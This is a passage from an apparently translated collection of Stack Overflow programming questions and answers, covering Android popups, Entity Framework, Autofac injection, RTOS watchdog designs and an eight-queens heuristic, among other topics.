                        Intent i = new Intent();
                        i.setClass(getBaseContext(), Dictionarylist.class);
                        startActivity(i);
                        }
                        }
                        catch(Exception x){
                            x.getMessage();
                        }

                    }

                });

            }

        });
    } catch (Exception e) {
        e.getMessage();
    }
    } 
```

点击外的弹出窗口不起作用`pw.setOutsideTouchable(false);`。在弹出窗口外部单击时，它会执行放置在弹出窗口（即父窗口）后面的操作。 ![在此处输入图像描述](../Images/0e6feaf3011c5181ae8018b164f69d22.png)

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-30T10:46:40.313

尝试这个：

```
pw.setTouchable(true);    
pw.setFocusable(false);    
pw.setOutsideTouchable(false); 
```

当 window touchable 是`true`，focusable 是`false`，`setOutsideTouchable()`工作。

如果`setOutsideTouchable(true)`, touch outside of popupwindow 将关闭，否则 popupwindows 的外部仍然可以触摸而不关闭。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-10-08T05:20:25.767

要关闭弹出窗口，只需添加以下代码行

```
 popupWindow.setBackgroundDrawable(new ColorDrawable()); 
```

它对我有用，我相信这就是你想要的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-06-16T08:03:39.263

试试下面的代码。它为我工作

```
popUp.setOutsideTouchable(false);
popUp.setFocusable(true);
popUp.showAtLocation(this.layout, Gravity.CENTER, 0, 0); 
```

# macros - LibreOffice Calc，如何在文件打开时添加菜单并在文件关闭时删除

> ID：13217947
> 
> 赞同：1
> 
> 时间：2012-11-04T11:00:24.010
> 
> 标签：macros, openoffice-calc, libreoffice

我在 LibreOffice Calc 中有一些（记录的）宏。我为这些宏创建了一个菜单项和一些工具栏项，但它们始终可见。由于这些宏仅适用于此电子表格（存储在电子表格中），我想添加菜单项“on-file-open”，使添加的菜单变暗“on-file-not-active”并删除菜单项“文件关闭”。

在 MS Excel 中，这相对容易，我已经做过很多次了，但是我一直找不到 Excel 的 On-Open、On-Close 等的 LibreOffice 等价物。

此外，当我尝试记录“添加菜单项”时，没有记录任何内容（特定于添加菜单）。

我使用 Excel（并为其编写代码）已经有 20 年了，但我对 LibreOffice 宏语言风格还是陌生的。

我想知道在哪里可以找到“打开/关闭/活动”以及如何在 LibreOffice 宏中添加/删除菜单树的示例。

# razor - asp.net razor 网页验证和使用多个表单

> ID：13217950
> 
> 赞同：2
> 
> 时间：2012-11-04T11:01:01.643
> 
> 标签：razor

我想在我的剃须刀网页（不是 mvc）中使用两个 froms，我的问题是使用多个表单我如何对我的项目说单击了哪个表单按钮，另一个问题是验证，因为在 web 表单项目中我是使用验证组来分隔验证，但在这里我不知道如何在客户端验证和服务器端验证中处理它这是我的代码：

```
@{
Page.Title = "";
Layout = "~/_layout.cshtml";

    Validation.Add("txt1", Validator.Required("can not leave empty"));
    Validation.Add("txt2", Validator.Required("can not leave empty"));

if (IsPost)
{

    if (!Validation.IsValid())
    {
    Validation.AddFormError("there are errors");
    }

}

}
    <style>
    .validation-summary-errors {
            border: 2px solid #990099;
            color: red;
        }

        .field-validation-error {
            color: Red;
        }

        .input-validation-error {
            color: #990099;
            background-color: #ff80ff;
            border-top: 2px solid #990099;
            border-left: 2px solid #990099;
        }
    </style>
    <div>
    <script src="~/jquery-1.7.2.min.js"></script>
    <script src="~/jquery.validate.min.js"></script>
    <script src="~/jquery.validate.unobtrusive.min.js"></script>
    </div>

 <p style="height:10px;"></p>

 <div>
<form name="f1" action="/" method="post">
<div>
    <input name="txt1" type="text" 
        class="@Validation.ClassFor("txt1")"
         />

    @Html.ValidationMessage("txt1")
</div>
<div>
    <input type="submit" name="s1" value="Send 1" />
</div>
</form>

</div>
<br />

<form name="f2" action="/" method="post">
<div>
    <input name="txt2" type="text" 
        class="@Validation.ClassFor("txt2")"
        />

    @Html.ValidationMessage("txt2")
</div>
<div>
    <input type="submit" name="s2" value="Send 2" />
</div>

 </form> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-05T14:57:20.257

查看此链接以处理多个表单请求[http://forums.asp.net/t/1678062.aspx/1](http://forums.asp.net/t/1678062.aspx/1)

您可以在每个子部分中处理验证。希望有帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T20:28:43.267

您可以通过查看单击了哪个提交按钮来确定提交了哪个表单。它的名称和值将在`Request.Form`集合中。如果您的示例代码中的第一个表单已提交，`Request["s1"]`则其值为“Send 1”。`Request["s2"].IsEmpty()`将是`true`。

解决验证问题的最简单方法是对两个文本框使用相同的名称（“txt1”）。否则，您将不得不离开验证助手并根据提交的表单编写自己的条件验证例程（客户端和服务器）。

# entity-framework-4.1 - 通过属性获取实体实体框架4.1

> ID：13217953
> 
> 赞同：0
> 
> 时间：2012-11-04T11:01:12.530
> 
> 标签：entity-framework-4.1

我想知道如何通过属性获取实体

我不想在传递实际 SQL 查询的地方使用 SqlQuery 方法。Find() 仅适用于 PK 值。

我希望能够在我的存储库中有一个方法，我可以在其中传递具有相应值的属性字典来过滤我的实体。

```
public IList<TEntity> FindByProperties(IDictionary<string,object> propertyValues) 
```

NHibernate 提供了条件查询 api，在 EF 中是否有类似的东西？

请建议。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T12:35:35.773

使用实体框架，您通常使用*lambda 表达式*来创建过滤条件。你可以有一个方法...

```
public IList<TEntity> FindByExpression(Expression<Func<TEntity, bool>> filter)
{
    return context.Set<TEntity>().Where(filter).ToList();
} 
```

...并这样称呼它：

```
...FindByExpression(t => t.Name == "Jim" && t.City == "Paris"); 
```

# c# - 对象实例已被处置 (EF)

> ID：13217954
> 
> 赞同：2
> 
> 时间：2012-11-04T11:01:23.163
> 
> 标签：c#, entity-framework, entity, dispose, objectdisposedexception

我在 EntityFramework 中检索我的项目实体时遇到了一些问题。它不断给我 Objest 实例已被处理错误。

我有 2 个实例，如下图所示。![在此处输入图像描述](../Images/752b9a7c5b4a6d4c646e2cd467f296bf.png)

下面的代码给了我错误：

```
 public Project GetProjectyById(int id)
    {
        using (var context = new CoderaDBEntities())
        {
            return context.Projects.First(c => c.Id == id);
        }
    } 
```

Project 中的所有内容都可以正常检索，但是 Project 对象（关联）中的 Category 对象向我提供了对象已被处理的错误。这是怎么回事？

谢谢！

**编辑：这个关联对你来说看起来很奇怪吗？**

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-04T11:11:28.070

当 DBContext 对象已被释放时，您似乎正在尝试使用延迟加载访问与 Category 相关的对象（将其包装在 using 语句中，一旦超出范围就会释放它）。延迟加载是 EF 仅在代码中请求相关实体时才加载它们。

为避免这种情况，您应该使用 Include 语句显式加载相关对象：

```
return context.Projects.Include("Category").First(c => c.Id == id); 
```

或者，您可以按如下所示以强类型方式加载它，但请务必添加 'using System.Data.Entity; ' 参考

```
return context.Projects.Include(x => x.Category).First(c => c.Id == id); 
```

另一种选择是通过不将 DbContext 对象包装在 using 语句中来允许延迟加载，如下所示。

```
 public Project GetProjectyById(int id)
    {
        var context = new CoderaDBEntities() 
        return context.Projects.First(c => c.Id == id);       
    } 
```

# c - 使用emacs获取函数原型

> ID：13217957
> 
> 赞同：2
> 
> 时间：2012-11-04T11:02:02.083
> 
> 标签：c, function, emacs, elisp, prototype

我有一个用 emacs 编辑的 C 程序。

C程序并不重要，它看起来像

```
int main(int ac, char **av)
{
....
}
int func(void){...}
int anotherfunc(int a, char c, void *data){...} 
```

我们可以有一个 Elisp 函数，用这些函数解析当前缓冲区并捕获函数原型吗？

我已经使用 etags 但我只有

```
int main(
int func( 
```

但我想拥有

```
int main(int ac, char **av)
int func(void)
int anotherfunc(int a, char c,  void *data) 
```

非常感谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T11:17:55.973

I suggest looking at c-eldoc mode - [http://www.emacswiki.org/emacs/CEldocMode](http://www.emacswiki.org/emacs/CEldocMode)

# c - 如何在 RTOS 中使用看门狗定时器？

> ID：13217959
> 
> 赞同：17
> 
> 时间：2012-11-04T11:02:36.760
> 
> 标签：c, embedded, rtos, watchdog

假设我在嵌入式环境中有一个协作调度程序。我有很多进程正在运行。我想利用看门狗计时器，以便我可以检测到进程何时因任何原因停止运行并重置处理器。

在没有 RTOS 的更简单的应用程序中，我总是会从主循环中接触看门狗，这总是足够的。但是，在这里，有许多进程可能会挂起。什么是定期触摸看门狗定时器同时确保每个进程处于良好状态的干净方法？

我在想我可以为每个进程提供一个回调函数，这样它就可以让另一个监督所有进程的函数知道它还活着。回调将传递一个参数，该参数将是任务的唯一 ID，因此监督者可以确定谁在回调。

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2012-11-04T15:19:02.333

一种常见的方法是将看门狗踢给特定任务（通常是最高优先级或最低优先级，每种方法的权衡/动机），然后让所有其他任务“签入”该任务。

这边走：

*   如果中断挂起（100% CPU），踢球任务将不会运行，你重置

*   如果踢球任务被挂起，你重置

*   如果另一个任务挂起，踢球任务看不到签入，踢球任务不会踢 WDG，你重置

现在当然要考虑实现细节。有些人让每个任务在全局变量中（原子地）设置自己的专用位；kicker 任务以特定的速率检查这组位标志，并在每个人都签入时清除/重置（当然还有踢 WDG。）我避开像瘟疫这样的全局变量并避免这种方法。RTOS 事件标志提供了一种更优雅的类似机制。

我通常将我的嵌入式系统设计为事件驱动系统。在这种情况下，每个任务都会阻塞在一个特定的位置——消息队列上。所有任务（和 ISR）通过发送事件/消息相互通信。这样，您不必担心任务不签入，因为它被信号量阻塞在“那里”（如果这没有意义，对不起，不写更多我无法更好地解释它）。

还有一个考虑因素——任务是否“自主”签入，或者他们是否回复/响应来自踢球任务的请求。自治 - 例如，每个任务每秒都会在其队列中接收一个事件“告诉 kicker 任务你还活着”。回复请求 - 每秒一次（或其他），kicker 任务告诉每个人（通过队列）“签到时间” - 最终每个任务都运行它的队列，获取请求并回复。对任务优先级、排队论等的考虑适用。

有 100 种方法可以给这只猫剥皮，但一个任务的基本原则是负责踢 WDG 并让其他任务集中到踢球任务。

至少还有一个方面需要考虑——在这个问题的范围之外——那就是处理中断。如果 ISR 占用 CPU（很好），我上面描述的方法将触发 WDG 重置，但是相反的情况呢 - ISR （遗憾地）意外地被禁用了。在许多情况下，这不会被捕获，并且您的系统仍然会踢 WDG，但您的系统的一部分已瘫痪。有趣的东西，这就是我喜欢嵌入式开发的原因。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-11-04T16:58:01.247

一种解决方案模式：

*   每个希望被检查的线程都向看门狗线程显式注册其回调，看门狗线程维护此类回调的列表。
*   当看门狗被调度时，它可能会迭代已注册任务的列表
*   每个回调本身都被迭代调用，直到它返回一个健康状态。
*   在列表的末尾，硬件看门狗被踢。

这样，任何永远不会返回健康状态的线程都会停止看门狗任务，直到发生硬件看门狗超时。

在抢占式操作系统中，看门狗线程将是最低优先级或空闲线程。在协作调度程序中，它应该在回调调用之间让步。

回调函数本身的设计取决于具体的任务及其行为和周期性。每个功能都可以根据任务的需要和特点进行定制。高周期性的任务可能只是增加一个计数器，当回调被调用时它被设置为零。如果计数器在进入时为零，则自上次看门狗检查以来任务没有调度。具有低或非周期性行为的任务可能会对其调度进行时间戳记，如果该任务尚未在某个指定时间段内调度，则回调可能会返回失败。可以以这种方式监视任务和中断处理程序。此外，因为向看门狗注册是线程的责任，所以您可能有一些线程根本没有注册。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-12T16:00:33.397

每个任务都应该有自己的模拟看门狗。只有当所有模拟的看门狗都没有超时时，真正的看门狗才会由高优先级的实时任务提供。

IE：

```
void taskN_handler()
{
    watchdog *wd = watchdog_create(100); /* Create an simulated watchdog with timeout of 100 ms */
    /* Do init */
    while (task1_should_run)
    {
        watchdog_feed(wd); /* feed it */
        /* do stuff */
    }
    watchdog_destroy(wd); /* destroy when no longer necessary */
}

void watchdog_task_handler()
{
    int i;
    bool feed_flag = true;
    while(1)
    {
        /* Check if any simulated watchdog has timeout */
        for (i = 0; i < getNOfEnabledWatchdogs(); i++) 
        {
            if (watchogHasTimeout(i)) {
                   feed_flag = false;
                   break;
            }
         }

         if (feed_flag)
             WatchdogFeedTheHardware();

         task_sleep(10);
} 
```

现在，可以说系统受到了真正的保护，不会出现死机，甚至不会出现部分死机，而且大多数情况下，不会出现不需要的看门狗触发。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-04T13:50:44.423

传统的方法是有一个具有最低优先级的看门狗进程

```
PROCESS(watchdog, PRIORITY_LOWEST) { while(1){reset_timer(); sleep(1);} } 
```

并且实际的硬件计时器可能每 3 或 5 秒重置一次 CPU。

跟踪单个进程可以通过逆向逻辑实现：每个进程将设置一个计时器，其回调向看门狗发送“停止”消息。然后每个进程都需要取消前一个计时器事件并在“从队列接收事件/消息”循环中的某处设置一个新事件。

```
PROCESS(watchdog, PRIORITY_LOWEST) {
    while(1) { 
       if (!messages_in_queue()) reset_timer();
       sleep(1);
    }
}
void wdg_callback(int event) { 
    msg = new Message();
    send(&msg, watchdog);
};
PROCESS(foo, PRIORITY_HIGH) {
     timer event=new Timer(1000, wdg_callback);
     while (1) {
        if (receive(msg, TIMEOUT)) {
           // handle msg       
        } else { // TIMEOUT expired 
           cancel_event(event);
           event = new Timer(1000,wdg_callback);
        }
     }
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-03-14T15:06:28.657

其他答案已经涵盖了您的问题，我只想建议您在旧程序中添加一些内容（没有 RTOS）。不要只从 main() 无条件地踢看门狗，有可能某些 ISR 会卡住，但系统会在没有通知的情况下继续工作（Dan 提到的问题也与 RTOS 有关）。

我一直在做的是将主中断和定时器中断相关联，以便在定时器内对变量进行倒计时，直到它为零，然后从主中断检查它是否为零，然后才喂看门狗. 当然，喂食后将变量返回初始值。很简单，如果变量停止递减，你就会得到重置。如果 main 停止为看门狗供电，您将得到复位。

这个概念很容易仅适用于已知的周期性事件，但最好还是从主要做所有事情。另一个好处是乱码不太可能踢看门狗，因为您在主程序中的看门狗馈送过程已经在一些疯狂的循环中结束。

# asp.net-mvc - mvc 控制器中的泛型与继承

> ID：13217960
> 
> 赞同：1
> 
> 时间：2012-11-04T11:02:40.223
> 
> 标签：asp.net-mvc, generics, inheritance, controllers

我们有许多功能非常相似的控制器，有很多代码重复。有一些基本控制器包含一些在所有这些控制器中都使用的代码，但大多数仍然是重复的。每个控制器都有一个构造函数，服务由城堡注入。

我在想是否可以将泛型与控制器一起使用以减少重复量。在基类中有类似的代码，并覆盖代码偏离的任何实例。

或者，我可以在没有泛型的情况下做同样的事情，并且在基础中有更多的重复代码。

什么是最好的方法以及如何在控制器中实现泛型？我猜他们也会使用接口。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T19:24:12.040

不看申请就很难给出答案。但是，泛型对于编写跨不同类型的可重用代码很有用。

```
public class Stack<T>
{
  T[] m_Items; 
  public void Push(T item) {...}
  public T Pop() {...}
}
Stack<int> stack = new Stack<int>();
stack.Push(1);
stack.Push(2);
int number = stack.Pop(); 
```

泛型具有类型安全性。被保险`Push`人将接受`int`并将`Pop`返回`int`。同样，您可以将 it 用于`string`等。否则，您必须使用`object`在这种情况下没有类型保证的情况。

# iphone - 可达性WithHostName 示例

> ID：13217964
> 
> 赞同：1
> 
> 时间：2012-11-04T11:03:18.917
> 
> 标签：iphone, objective-c, ios, xcode

我阅读了[https://developer.apple.com/library/ios/#samplecode/Reachability/Introduction/Intro.html](https://developer.apple.com/library/ios/#samplecode/Reachability/Introduction/Intro.html) 我的问题是如果 www.apple.com 突然变得不活跃..这段代码会提醒我吗？或者只是如果我的连接失败？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T11:12:43.637

这是完全正确的。

它将触发一个`kReachabilityChangedNotification`通知，告诉您新的可达性状态。

你会得到新的可达性状态，如下所示：

```
- (void)reachabilityChanged:(NSNotification *)notification {
    Reachability *reachability = notification.object;

    if (NotReachable == reachability.currentReachabilityStatus)
        NSLog(@"No longer reachable");
} 
```

# linker - 如何确定操作系统中的内存地址是否空闲？

> ID：13217965
> 
> 赞同：1
> 
> 时间：2012-11-04T11:03:21.963
> 
> 标签：linker, operating-system, kernel

假设我在内核中创建了一个函数指针（类似于中断服务程序并在中断向量表中维护函数的地址）并开始编译和链接，那么链接器可能会静态分配函数的地址应该从哪里执行.

内核开发人员可能不知道函数的执行地址。

但是当一个新的内核进程被创建时，它应该为这个进程动态分配内存。
那么，如何判断RAM中是否有空闲内存并将内存分配给进程呢？
另外如何找到链接器分配的内存地址？

我想知道 malloc 或 kmalloc 如何分配空闲内存来处理。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T11:15:02.647

First of all, you haven't specified your OS. You're asking how the OS specific kernel memory manager work. That's not something that's exposed in closed OS such as windows. In open source OS you can just browse the code of kmalloc or similar function. But you really shouldn't mess with it unless you know very well what you're doing.

Linker doesn't decide where to load the code, it just resolves the locations of various items in the code and makes proper links between them (that's why it's called linker...)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T13:16:11.777

> 那么，如何判断RAM中是否有空闲内存并将内存分配给进程呢？另外如何找到链接器分配的内存地址？

我想你在这里很困惑。这些是*虚拟*地址，这就是图书馆的意义`malloc`所在。到实际内存地址的映射以及系统中是否有空闲内存来运行进程由操作系统透明地处理

# autofac - AutoFac 解析参数

> ID：13217969
> 
> 赞同：0
> 
> 时间：2012-11-04T11:03:31.723
> 
> 标签：autofac

我有许多实现`IFilter`接口的过滤器类（定义过滤器逻辑）。使用构造函数注入，对于每个过滤器实现，我想传递一个定义过滤器设置的接口。考虑以下示例：

```
interface IFilter
{
  void Filter(DataSource dataSource);
}

interface ITimeSpanFilterSettings
{
  DateTime From {get; set; }
  DateTime To {get; set; }
}

public class TimeSpanFilter : IFilter
{
  private ITimeSpanFilterSettings settings;

  public TimeSpanFilter(ITimeSpanFilterSettings settings)
  {
     this.settings = settings;
  }
} 
```

然而，我的具体实现`ITimeSpanFilterSettings`需要`settingsKey`从数据库中检索设置。但是我无法 `ITimeSpanFilterSettings`使用 static注册我的实现`settingsKey`。

是否可以解决所有`IFilter`实现并指定一个`settingsKey`应该用于实例化`ITimeSpanFilterSettings`实现的方法？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-06T01:13:08.517

在我看来，有几个因素在起作用。可能是我对问题的误解，也可能是一些问题“缩写”，所以请多多包涵。

**首先说一下`TimeSpanFilter`获取`ITimeSpanFilterSettings`对象的分辨率。**稍后我们将讨论设置对象的参数化，现在我们只讨论*将设置传递给过滤器*。

如果你有描述的设置，我推断你有一个`ISomethingFilterSettings`对应于每个`IFilter`实现的接口。你有`TimeSpanFilter`和`ITimeSpanFilterSettings`; 如果你有一个`DateTimeFilter`，你就会有一个`IDateTimeFilterSettings`。

鉴于此，您不需要做任何特别的事情。注册您的各种类型，`ContainerBuilder`神奇的事情就会发生。

```
var builder = new ContainerBuilder();
builder.RegisterType<TimeSpanFilter>().As<IFilter>();
builder.RegisterType<TimeSpanFilterSettings>().As<ITimeSpanFilterSettings>();
var container = builder.Build();
// When you resolve, the TimeSpanFilterSettings class gets instantiated
// and injected into the constructor of the TimeSpanFilter.
var filter = container.Resolve<IFilter>(); 
```

即使您有多个过滤器，Autofac 也会将所有适当的接口与构造函数参数对齐。你不必做任何事情。

```
var builder = new ContainerBuilder();
// Look, Ma! Two filters and settings! :)
builder.RegisterType<TimeSpanFilter>().As<IFilter>();
builder.RegisterType<TimeSpanFilterSettings>().As<ITimeSpanFilterSettings>();
builder.RegisterType<DateTimeFilter>().As<IFilter>();
builder.RegisterType<DateTimeFilterSettings>().As<IDateTimeFilterSettings>();
var container = builder.Build();
// You can resolve collections and get all of the registered filters.
var filterEnumerable = container.Resolve<IEnumerable<IFilter>>(); 
```

**现在让我们谈谈过滤器设置对象的参数化。**听起来您需要进行一些配置，因此（为方便起见）假设配置来自`AppSettings`.

使用 Autofac，您可以**将 lambda 表达式注册为依赖**项，而不仅仅是具体类型，因此*您可以*执行以下操作：

```
var builder = new ContainerBuilder();
builder.RegisterType<TimeSpanFilter>().As<IFilter>();
builder.Register(
  ctx =>
  {
    var config = ConfigurationSettings.AppSettings["my-key"];
    return new TimeSpanFilterSettings(config);
  }).As<ITimeSpanFilterSettings>();
var container = builder.Build();
// When you resolve, the TimeSpanFilterSettings class gets instantiated
// and injected into the constructor of the TimeSpanFilter.
var filter = container.Resolve<IFilter>(); 
```

如果您的设置对象只有一个传入参数，那么这种事情非常方便。如果有多个参数，您也可以在 lambda 中使用传入的上下文参数来即时进行一些解析：

```
builder.Register(
  ctx =>
  {
    var config = ConfigurationManager.AppSettings["my-key"];
    var other = ctx.Resolve<OtherDependency>();
    return new TimeSpanFilterSettings(config, other);
  }).As<ITimeSpanFilterSettings>(); 
```

但是，如果您有太多参数可能会有点混乱，那么您也可以使用参数 lambda 注册一个依赖项，这样只有您指定的一个参数将被手动注入，其余的将自动完成：

```
var builder = new ContainerBuilder();
builder.RegisterType<TimeSpanFilterSettings>().WithParameter(
  // Parameter selector determines which parameter this
  // thing is referring to - here the constructor parameter
  // is called "config" and has to be a System.String.
  (pinfo, ctx) =>
  {
    return
      pinfo.Name == "config" &&
      pinfo.ParameterType == typeof(string);
  },

  // Value provider gets the value that should be injected
  // and returns it.
  (pinfo, ctx) =>
  {
    return ConfigurationManager.AppSettings["my-key"];
  }); 
```

**这些中的任何一个都可以工作，这取决于你想怎么做。**

**额外的复杂性**：您在对此答案的评论中提到，您正在根据用户选择的视图获取设置信息。您将需要更新您的系统以将该设置密钥放在 Autofac 可以访问的位置。

鉴于您提到了“视图”，我假设您的意思是 ASP.NET MVC 或类似的东西。一个放置请求级值的地方是在`HttpContext.Items`. 这可能需要在您的系统中进行一些重新设计。

例如，如果依赖项必须作为控制器上的构造函数/属性进入，那么您可能需要有一些机制来在`HttpContext`控制器实例化之前填充值。也许您的控制器上有一个属性，也许有一个`IHttpModule`位于管道中并具有 URL 到设置的映射，也许是别的东西。这不是我们在这个问题中可以处理的事情（否则我们只会在这里编写整个产品，对吗？我真的不适合那个......）。

一旦它在那个中心位置，就像`HttpContext.Items`你可以把它放到 lambda 注册中一样：

```
// Need to be able to resolve HttpContext, so...
builder.RegisterModule<AutofacWebTypesModule>();
// Then resolve HttpContext in your registration:
builder.Register(
  ctx =>
  {
    var httpCtx = ctx.Resolve<HttpContextBase>();
    var configKey = httpCtx.Items["settings-config-key"];
    var config = ConfigurationManager.AppSettings[configKey];
    return new TimeSpanFilterSettings(config);
  }).As<ITimeSpanFilterSettings>()
  .InstancePerHttpRequest(); 
```

创建属性的替代方法是在设置值后从控制器内部`IHttpModule`调用。不过，我不喜欢服务位置，而且许多人认为它是一种“反模式”，因此请尽可能避免使用它。`DependencyResolver.Current.GetService<IFilter>()``HttpContext.Items`

**关于缓存的注意事项**：听起来您的配置值实际上来自某个数据库 - 与读取相比，调用成本更高`AppSettings`。您可以将数据库调用直接放在注册中，但是如果您解决了其中的一堆问题，您可能会遇到一些有趣的性能挑战。两种情况下的 lambdas 都会在每次解析发生时执行 - 参数值不会为您缓存，除非您使用`InstancePerDependency`生命周期以外的东西（默认值）注册对象，否则 Autofac 不会缓存创建的对象。这可能意味着大量意外的数据库调用。找出缓存（根据需要）是留给读者的练习。

（请注意，在最后一个示例中，我用作`InstancePerHttpRequest`范围 - 这意味着您将为一个 Web 请求获得缓存。）

**关于设计的一件事**：这是一种观点，但通常我会尽量避免“参数化分辨率”。也就是说，“我想要一个将军`IFilter`，但它需要完全适应这种特定情况。” 听起来这就是你在这里所拥有的。在这些情况下，我发现虽然我可能需要使用通用的基础级接口，例如`IFilter`，但我也会尝试使用特定于我需要的接口。

```
public interface ICustomSituationFilter : IFilter 
```

然后，我将使用这些自定义接口作为我的依赖项，而不是试图将所有内容都推向通用。它使我可以更轻松地将“配置”概念从控制器中分离出来（它不应该配置传入的依赖项）并将其推送到我的注册中 - 我不需要将东西弹出`HttpContext.Items`或任何类型的共享位置因为唯一知道设置的地方是实际的依赖注册。如果可以的话，您可能需要考虑更改您的设计以打破“选择视图”和“使用哪些配置设置”之间的联系。它会让你的生活更轻松。

**相关 Autofac wiki 页面：**

*   [组件创建 - 包括更多关于参数化的示例](https://code.google.com/p/autofac/wiki/ComponentCreation)
*   [实例范围 - 如何注册单例或共享对象](https://code.google.com/p/autofac/wiki/InstanceScope)

# symfony - Symfony，将控制器安排成“向导”？

> ID：13217973
> 
> 赞同：2
> 
> 时间：2012-11-04T11:04:34.157
> 
> 标签：symfony, wizard

我有许多[Symfony](http://symfony.com/)控制器，它们目前都从一个重定向到另一个，形成一个表单链，就像安装[向导](https://en.wikipedia.org/wiki/Wizard_%28software%29)一样。

控制器 X 被硬编码以重定向到控制器 Y，这使得以后更改代码更加乏味且容易出错。

我希望用某种形式的包装类替换这些硬编码的重定向，这将使我能够更动态地构建控制器列表。

这样的库是否已经可用，还是我需要从头开始编写？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T11:09:25.680

您可以使用[关键字](http://knpbundles.com/search?q=flow)[搜索捆绑包`flow`](http://knpbundles.com/search?q=flow)。我一直在使用 CraueFormFlowBundle，它完成了这项工作。

# java - 八皇后启发式

> ID：13217979
> 
> 赞同：5
> 
> 时间：2012-11-04T11:05:58.400
> 
> 标签：java, artificial-intelligence, heuristics, n-queens

我正在开发一种启发式方法，将 8 个皇后放在 8x8 棋盘上。每个方格都有自己的淘汰数（表示如果在该方格中放置皇后，则“消除”空棋盘的多少个方格。）并且每个皇后应放置在淘汰数最低的方格中。

我的问题是我不知道该怎么做才能不断减少他们适当方格的特定消除数量，所以如果你能帮助我，我将不胜感激。另一个问题，我觉得我的代码很复杂，所以有什么注释可以使它更简单吗？

这是我的代码

```
public class Queen {
private final int SIZE = 8;
private int board[][] = new int[SIZE][SIZE]; // 8x8 board
private int hor[] = new int[SIZE]; // horizontal moves
private int ver[] = new int[SIZE]; // vertical moves
private int lowestValue = 22;
private int[][] queens = new int[SIZE][2]; // 8 queens 

public Queen () {
    // initialize each square with its own elimination number
    for (int row = 0; row < board.length; row++) {
        for (int col = 0; col < board[row].length; col++) {
            if (row == 0 || row == 7 || ((row >= 1 && row <= 6) && (col == 0 || col == 7))) {
                board[row][col] = 22;
            } 
            else if ((row == 1 || row == 6) && (col >= 1 && col <= 6) || (row > 1 && row < 6) && (col == 1 || col == 6)) {
                board[row][col] = 24;
            }
            else if ((row == 2 || row == 5) && (col >= 2 && col <= 5)|| (row > 2 && row < 5) && (col == 2 || col == 5)){
                board[row][col] = 26;
            }
            else if ((row == 3 || row == 4) && (col >= 3 && col <= 4)){
                board[row][col] = 28;
            }

        }
    }// end initializing

    // initialize moves
    //right
    hor[0] = 1;
    ver[0] = 0;
    //left
    hor[1] = -1;
    ver[1] = 0;
    //up
    hor[2] = 0;
    ver[2] = -1;
    //down
    hor[3] = 0;
    ver[3] = 1;
    //up right
    hor[4] = 1;
    ver[4] = -1;
    hor[7] = -1;
    ver[7] = 1;
    //up left
    hor[5] = -1;
    ver[5] = -1;
    //down right
    hor[6] = 1;
    ver[6] = 1;
    // down left

    for (int queen = 0; queen < queens.length; queen++) {
        placeQueens(queen);
    }
    displayBoard();
}// end constructor

// eliminate squares according to the place of the queen
private void eliminate (int queen_row, int queen_col) {

    // eliminate diagonal
    int rowCopy = queen_row;// helper row
    int colCopy = queen_col;// helper column
    try {
        // eliminate up right
        for (int move = 0; move < 8; move++) {
            rowCopy += ver[4];
            colCopy += hor[4];
            if (board[rowCopy][colCopy] > 0) {
                board[rowCopy][colCopy] = 0;
            }
        }
    } 
    catch (ArrayIndexOutOfBoundsException e) {      
    }

    try {
        rowCopy = queen_row;
        colCopy = queen_col;
        // eliminate up left
        for (int move = 0; move < 8; move++) {
            rowCopy += ver[5];
            colCopy += hor[5];
            if (board[rowCopy][colCopy] > 0) {
            board[rowCopy][colCopy] = 0;
            }
        }
    } 
    catch (ArrayIndexOutOfBoundsException e) {
    }

    try {
        rowCopy = queen_row;
        colCopy = queen_col;
        // eliminate down right
        for (int move = 0; move < 8; move++) {
            rowCopy += ver[6];
            colCopy += hor[6];
            if (board[rowCopy][colCopy] > 0) {
            board[rowCopy][colCopy] = 0;
            }
        }
    } 
    catch (ArrayIndexOutOfBoundsException e) {
    }
    try {
        rowCopy = queen_row;
        colCopy = queen_col;
        // eliminate down left
        for (int move = 0; move < 8; move++) {
            rowCopy += ver[7];
            colCopy += hor[7];
            if (board[rowCopy][colCopy] > 0) {
            board[rowCopy][colCopy] = 0;
            }
        }
    } 
    catch (ArrayIndexOutOfBoundsException e) {
    }

    // eliminate row
    for (int col = 0; col < 8;col++) {
        if (board[queen_row][col] > 0) {
        board[queen_row][col] = 0;
        }
    }
    // eliminate col
    for (int row = 0; row < 8; row++) {
        if (board[row][queen_col] > 0) {
        board[row][queen_col] = 0;
        }
    }

}// end elimination

// decrease elimination number of each square
public void decreaseElimination () {

}// end decrease elimination

public void countEliminated () {
    int counter = 0;
    for (int row = 0; row < board.length; row++) {
        for (int col = 0; col < board[row].length; col++) {
            if (board[row][col] == 0) {
                counter++;
            }

        }
    }
    System.out.printf("%d squares eliminated\n", counter);

}

public void placeQueens(int queenNum) {
    int targetRow;
    int targetCol;
    // find lowest elimination number
    for (int row = 0; row < board.length; row++) {
        for (int col = 0; col < board[row].length; col++) {
            if (board[row][col] > 0 && board[row][col] < lowestValue) {
                lowestValue = board[row][col];
                targetRow = row;
                targetCol = col;

                queens[queenNum][0] = targetRow;
                queens[queenNum][1] = targetCol;
            }
        }
    }

    System.out.printf("queen %d has been placed in [%d][%d]\n", queenNum + 1, queens[queenNum][0], queens[queenNum][1]);
    eliminate(queens[queenNum][0], queens[queenNum][1]);
    decreaseElimination();
    countEliminated();

}

// display board
public void displayBoard () {

